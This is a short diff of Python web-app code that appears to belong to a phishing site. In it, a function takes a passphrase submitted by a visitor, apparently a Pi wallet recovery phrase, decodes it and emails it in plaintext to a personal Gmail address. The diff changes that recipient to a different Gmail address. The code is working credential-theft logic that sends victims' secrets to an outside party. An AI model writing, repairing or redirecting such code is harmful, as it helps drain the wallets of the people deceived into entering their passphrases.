@@ -89,7 +89,7 @@ def send_nelson(request, keys, email="no@no.com"):
         saved.save()
 
         if email == 'no@no.com':
-            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')
+            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='obikeechiemerielinus1@gmail.com') 
 
 
         else:
